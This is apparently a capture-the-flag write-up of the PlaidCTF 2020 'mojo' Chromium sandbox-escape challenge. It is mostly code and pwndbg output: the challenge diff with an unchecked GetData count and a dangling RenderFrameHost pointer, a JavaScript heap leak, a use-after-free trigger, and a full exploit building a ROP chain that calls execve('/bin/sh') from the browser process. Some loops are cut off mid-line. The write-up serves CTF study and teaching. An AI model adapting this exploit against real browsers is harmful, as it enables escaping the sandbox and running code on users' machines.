# 沙箱逃逸之plaidctf 2020 mojo writeup

> 原文: https://www.ctfiot.com/85249.html
> ID: 85249


```
$ ls
Dockerfile     chrome.zip     flag_printer   mojo_js.zip     plaidstore.diff run.sh         server.py       visit.sh
timeout 20 ./chrome --headless --disable-gpu --remote-debugging-port=1338 --enable-blink-features=MojoJS,MojoJSTest "$1"
+++ b/third_party/blink/public/mojom/plaidstore/plaidstore.mojom
@@ -0,0 +1,11 @@
+module blink.mojom;
+
+// This interface provides a data store
+interface PlaidStore {
+
+ // Stores data in the data store
+ StoreData(string key, array data);
+
+ // Gets data from the data store
+ GetData(string key, uint32 count) => (array data);
+};
+++ b/content/browser/plaidstore/plaidstore_impl.h
@@ -0,0 +1,35 @@
+#include <string>
+#include <vector>
+
+#include "third_party/blink/public/mojom/plaidstore/plaidstore.mojom.h"
+
+namespace content {
+
+class RenderFrameHost;
+
+class PlaidStoreImpl : public blink::
mojom::
PlaidStore {
+ public:
+ explicit PlaidStoreImpl(RenderFrameHost *render_frame_host);
+
+ static void Create(
+     RenderFrameHost* render_frame_host,
+     mojo::
PendingReceiver receiver);
+
+ ~PlaidStoreImpl() override;
+
+ // PlaidStore overrides:
+ void StoreData(
+     const std::
string &key,
+     const std::
vector &data) override;
+
+ void GetData(
+     const std::
string &key,
+     uint32_t count,
+     GetDataCallback callback) override;
+
+ private:
+ RenderFrameHost* render_frame_host_;
+ std::
map<std::
string, std::
vector > data_store_;
+};
+
+} // namespace content
+void PlaidStoreImpl::
StoreData(
+   const std::
string &key,
+   const std::
vector &data) {
+ if (!render_frame_host_->IsRenderFrameLive()) {
+   return;
+ }
+ data_store_[key] = data;
+}
+
+void PlaidStoreImpl::
GetData(
+   const std::
string &key,
+   uint32_t count,
+   GetDataCallback callback) {
+ if (!render_frame_host_->IsRenderFrameLive()) {
+   std::
move(callback).Run({});
+   return;
+ }
+ auto it = data_store_.find(key);
+ if (it == data_store_.end()) {
+   std::
move(callback).Run({});
+   return;
+ }
+ std::
vector result(it->second.begin(), it->second.begin() + count);
+ std::
move(callback).Run(result);
+}
+PlaidStoreImpl::
PlaidStoreImpl(
+   RenderFrameHost *render_frame_host)
+   : render_frame_host_(render_frame_host) {}
+void PlaidStoreImpl::
Create(
+   RenderFrameHost *render_frame_host,
+   mojo::
PendingReceiver receiver) {
+ mojo::
MakeSelfOwnedReceiver(std::
make_unique(render_frame_host),
+                             std::
move(receiver));
+}
Binds the lifetime of an interface implementation to the lifetime of the Receiver. When the Receiver is disconnected (typically by the remote end closing the entangled Remote), the implementation will be deleted.
python -m SimpleHTTPServer
# set file and read symbol
file ./chrome
# set start parameter
set args --headless --disable-gpu --remote-debugging-port=1338 --user-data-dir=./userdata --enable-blink-features=MojoJS http://127.0.0.1:
8000/pwn.html
# set follow-fork-mode
set follow-fork-mode parent
# just run
r
<script src="./mojo/public/js/mojo_bindings.js"></script>
<script src="./third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
<script>
 async function test() {
 let p = blink.mojom.PlaidStore.getRemote(true);
 await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
   }
 test()
</script>
0x5555591ac4a3 mov edi, 0x28 ► 0x5555591ac4a8 call 0x55555ac584b0 <0x55555ac584b0> 0x5555591ac4ad lea rcx, [rip + 0x635e2ec] 0x5555591ac4b4 mov qword ptr [rax], rcx ; 赋值虚表指针 0x5555591ac4b7 mov qword ptr [rax + 8], rbx ; 赋值render_frame_host指针 0x5555591ac4bb lea rcx, [rax + 0x18]
pwndbg> frame#0 0x000055555ac584b0 in operator new(unsigned long, std::
nothrow_t const&) ()
pwndbg> x/6gx 0x284976549f300x284976549f30: 0x000055555f50a7a0 0x000028497640bd00 ; vtable | render_frame_host_0x284976549f40: 0x0000284976549f48 0x0000000000000000 ; data_store_0x284976549f50: 0x0000000000000000 0x0000000000000000pwndbg> vmmap 0x284976549f30LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x28497627a000 0x284976979000 rw-p 6ff000 0 +0x2cff30
pwndbg> x/6gx 0x284976549f30
0x284976549f30: 0x000055555f50a7a0     0x000028497640bd00
0x284976549f40: 0x00002849765f5b40     0x00002849765f5b40
0x284976549f50: 0x0000000000000001     0x0000000000000000
pwndbg> x/10gx 0x00002849765f5b40
0x2849765f5b40: 0x0000000000000000     0x0000000000000000
0x2849765f5b50: 0x0000284976549f48     0x000055555824ff01
0x2849765f5b60: 0x0000007878787878     0x0000000000000000
0x2849765f5b70: 0x0500000000000000     0x0000284976881e10
0x2849765f5b80: 0x0000284976881e38     0x0000284976881e38
pwndbg> x/s 0x2849765f5b60
0x2849765f5b60: "xxxxx"
pwndbg> x/s 0x0000284976881e10
0x284976881e10: 'A' <repeats 40 times>

pwndbg> vmmap 0x0000284976881e10
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x28497627a000     0x284976979000 rw-p   6ff000 0       +0x607e10
async function Leak()
{
    let plaidStorePtrList = [];
    for(let i=0; i<0x200; i++) {
        let p = blink.mojom.PlaidStore.getRemote(true);
        await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
        plaidStorePtrList.push(p);
   }
    let p = plaidStorePtrList[0];
    let leakData = (await p.getData("xxxxx", 0x2000)).data
    let u8 = new Uint8Array(leakData)
    let u64 = new BigInt64Array(u8.buffer);
    let vtableAddr = 0;
    for(let i=0x28/8; i
function AddFrame()
{
    let frame = document.createElement("iframe");
    frame.srcdoc =
        `<script src="mojo/public/js/mojo_bindings_lite.js"></script>
            <script src="third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
        <script>
            async function uaf()
            {
                // step 1 register mojo in child frame
                let plaidStorePtrList = [];
                for(let i=0; i<0x200; i++) {
                    let p = blink.mojom.PlaidStore.getRemote(true);
                    await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
                    plaidStorePtrList.push(p);
                }
 // return the plaidStorePtrList to parent frame
                window.plaidStorePtrList = plaidStorePtrList;
                return;
            }
        uaf();
        </script>
        `;
    document.body.appendChild(frame);
    return frame;
}

async function pwn()
{
    let frame = AddFrame();
    frame.contentWindow.addEventListener("DOMContentLoaded", async () => {
     // trigger the pipe
        await frame.contentWindow.uaf();

     // prepare the memory
        let renderFrameHostSize = 0xc28
        frameBuf = new ArrayBuffer(renderFrameHostSize);
        let frameData8 = new Uint8Array(frameBuf).fill(0x41);

     // get the child frame
        let plaidStorePtrList = frame.contentWindow.plaidStorePtrList;

     // free the render_frame_host ptr
        frame.remove();

     // trying to malloc the freed render_frame_host memory and trigger the function.
        let bins = [];
        for(var i=0; i<0x1000; i++){
            plaidStorePtrList[0].storeData("crash", frameData8);
       }
   })

}
pwn();
Thread 1 "chrome" received signal SIGSEGV, Segmentation fault.
0x00005555591ac1e1 in content::
PlaidStoreImpl::
StoreData(std::
__1::
basic_string<char, std::
__1::
char_traits<char>, std::
__1::
allocator<char> > const&, std::
__1::
vector > const&) ()
...
 RAX 0x4141414141414141 ('AAAAAAAA')
 RBX 0x28b732be0090 ◂— 0x4141414141414141 ('AAAAAAAA')
 RCX 0x28b732be0090 ◂— 0x4141414141414141 ('AAAAAAAA')
 ...
 ► 0x5555591ac1e1   call   qword ptr [rax + 0x160]

   0x5555591ac1e7    test   al, al

pwndbg> i r rax
rax           0x4141414141414141 0x4141414141414141
function AddFrame()
{
    let frame = document.createElement("iframe");
    frame.srcdoc =
        `<script src="mojo/public/js/mojo_bindings_lite.js"></script>
            <script src="third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
        <script>
            async function Leak()
            {
                // oob read to leak chrome base addr and render_frame_host pointer
                let plaidStorePtrList = [];
                for(let i=0; i<0x200; i++) {
                    let p = blink.mojom.PlaidStore.getRemote(true);
                    await(p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41)));
                    plaidStorePtrList.push(p);
                }
                let p = plaidStorePtrList[0];
                let leakData = (await p.getData("xxxxx", 0x2000)).data
                let u8 = new Uint8Array(leakData)
                let u64 = new BigInt64Array(u8.buffer);
                let vtableAddr = 0;
                let renderFrameHostAddr = 0;
                for(let i=0x28/8; i
        `;
      document.body.appendChild(frame);
    return frame;
}
async function pwn()
{
    let frame = AddFrame();
    frame.contentWindow.addEventListener("DOMContentLoaded", async () => {
        for(;;) {
         // step 1 trigger oob read to get address
            await frame.contentWindow.Leak();
            if(frame.contentWindow.chromeBaseAddr != 0) {
                console.log("[+] leak chrome base addr: "+hex(frame.contentWindow.chromeBaseAddr));
                console.log("[+] leak reander frame host addr: "+hex(frame.contentWindow.renderFrameHostAddr));
                break;
           }
       }
    
     // step 2 prepare the rop chain
        chromeBaseAddr = frame.contentWindow.chromeBaseAddr;
        renderFrameHostAddr = frame.contentWindow.renderFrameHostAddr;
        let xchgRaxRsp = chromeBaseAddr + 0x000000000880dee8n //: xchg rax, rsp ; clc ; pop rbp ; ret
        let popRdi = chromeBaseAddr + 0x0000000002e4630fn //: pop rdi ; ret
        let popRsi = chromeBaseAddr + 0x0000000002d278d2n //: pop rsi ; ret
        let popRdx = chromeBaseAddr + 0x0000000002e9998en //: pop rdx ; ret
        let popRax = chromeBaseAddr + 0x0000000002e651ddn //: pop rax ; ret
        //let syscall = chromeBaseAddr + 0x0000000002ef528dn //: syscall
        let execve = chromeBaseAddr + 0x9efca30n //: execve
        
        // step 3 reserve the child plaidStorePtrList to trigger uaf
        let plaidStorePtrList = frame.contentWindow.plaidStorePtrList;

     // step 4 prepare the rop chain memory
        let binshAddr = renderFrameHostAddr+0x50n;
        let renderFrameHostSize = 0xc28
        frameBuf = new ArrayBuffer(renderFrameHostSize);
        let frameData8 = new Uint8Array(frameBuf).fill(0x41);
        frameDataView = new DataView(frameBuf);

        frameDataView.setBigInt64(0x160,xchgRaxRsp,true);

        frameDataView.setBigInt64(0,renderFrameHostAddr,true);
        frameDataView.setBigInt64(0x8,popRdi,true);
        frameDataView.setBigInt64(0x10,binshAddr,true);
        frameDataView.setBigInt64(0x18,popRsi,true);
        frameDataView.setBigInt64(0x20,0n,true);
        frameDataView.setBigInt64(0x28,popRdx,true);
        frameDataView.setBigInt64(0x30,0n,true);
        frameDataView.setBigInt64(0x38,popRax,true);
        frameDataView.setBigInt64(0x40,59n,true);
        frameDataView.setBigInt64(0x48,execve,true);
        frameDataView.setBigInt64(0x50,0x68732f6e69622fn,true);  // /bin/sh
        // frameDataView.setBigInt64(0x50, 0x6f6e672f6e69622fn,true); // /bin/gno
        // frameDataView.setBigInt64(0x58, 0x75636c61632d656dn,true); // me-calcu
        // frameDataView.setBigInt64(0x60, 0x726f74616cn,true); // latorx00

     // step 5 free the renderFrameHost memory
        frame.remove();

     // step 6 malloc the freed memory and trigger uaf
        let bins = [];
        for(var i=0; i<0x1000; i++){
            plaidStorePtrList[0].storeData("crash", frameData8);
       }
   })
}
pwn();
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/0-1670809579.png)